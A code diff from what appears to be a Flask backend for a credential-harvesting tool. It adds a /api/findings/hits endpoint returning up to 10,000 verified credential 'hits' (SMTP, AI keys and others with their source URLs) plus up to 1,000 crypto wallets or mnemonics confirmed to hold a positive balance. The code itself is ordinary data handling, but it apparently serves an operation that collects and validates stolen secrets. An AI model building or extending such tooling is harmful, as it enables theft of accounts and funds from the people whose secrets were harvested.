@@ -358,30 +358,16 @@ def get_statistics():
     ''')
     type_counts = dict(cursor.fetchall())
 
-    # Fetch non-crypto and confirmed-balance crypto independently so a large
-    # batch of unverified wallets can't crowd out email/SMTP/AI/etc. hits.
+    # Keep stats payload light — only the most recent 200 rows for the
+    # activity feed and overview widgets. FindingsBoard loads its own data
+    # from /api/findings/hits which has no polling overhead.
     cursor.execute('''
         SELECT type, key_value, source_url, timestamp, metadata, status, id
         FROM credentials
-        WHERE type NOT IN ('Crypto', 'Mnemonic')
-          AND status IN ('valid', 'hit')
-        ORDER BY id DESC LIMIT 5000
+        WHERE status IN ('valid', 'hit')
+        ORDER BY id DESC LIMIT 200
     ''')
-    non_crypto_findings = cursor.fetchall()
-
-    cursor.execute('''
-        SELECT type, key_value, source_url, timestamp, metadata, status, id
-        FROM credentials
-        WHERE type IN ('Crypto', 'Mnemonic')
-          AND status IN ('valid', 'hit')
-          AND verify_meta IS NOT NULL
-          AND json_extract(verify_meta, '$.balance_native') IS NOT NULL
-          AND json_extract(verify_meta, '$.balance_native') > 0
-        ORDER BY id DESC LIMIT 500
-    ''')
-    crypto_findings = cursor.fetchall()
-
-    recent_findings = non_crypto_findings + crypto_findings
+    recent_findings = cursor.fetchall()
     
     conn.close()
     
@@ -9126,6 +9112,41 @@ def api_findings_smtp():
         rows = [_serialize_credential(r) for r in c.fetchall()]
         conn.close()
         return jsonify({'ok': True, 'findings': rows})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+
+@app.route('/api/findings/hits', methods=['GET'])
+def api_findings_hits():
+    """Full Hits table — returns the same tuple format as recent_findings but
+    with an independent high limit so the polling stats endpoint stays light.
+    Non-crypto: up to 10000 rows. Confirmed-balance crypto: up to 1000 rows."""
+    try:
+        conn = sqlite3.connect(DB_PATH, timeout=30)
+        c = conn.cursor()
+        c.execute('''
+            SELECT type, key_value, source_url, timestamp, metadata, status, id
+            FROM credentials
+            WHERE type NOT IN ('Crypto', 'Mnemonic')
+              AND status IN ('valid', 'hit')
+            ORDER BY id DESC LIMIT 10000
+        ''')
+        non_crypto = c.fetchall()
+        c.execute('''
+            SELECT type, key_value, source_url, timestamp, metadata, status, id
+            FROM credentials
+            WHERE type IN ('Crypto', 'Mnemonic')
+              AND status IN ('valid', 'hit')
+              AND verify_meta IS NOT NULL
+              AND json_extract(verify_meta, '$.balance_native') IS NOT NULL
+              AND json_extract(verify_meta, '$.balance_native') > 0
+            ORDER BY id DESC LIMIT 1000
+        ''')
+        crypto = c.fetchall()
+        conn.close()
+        # Return same tuple order as recent_findings so mapRecent() works directly
+        findings = non_crypto + crypto
+        return jsonify({'ok': True, 'findings': findings})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
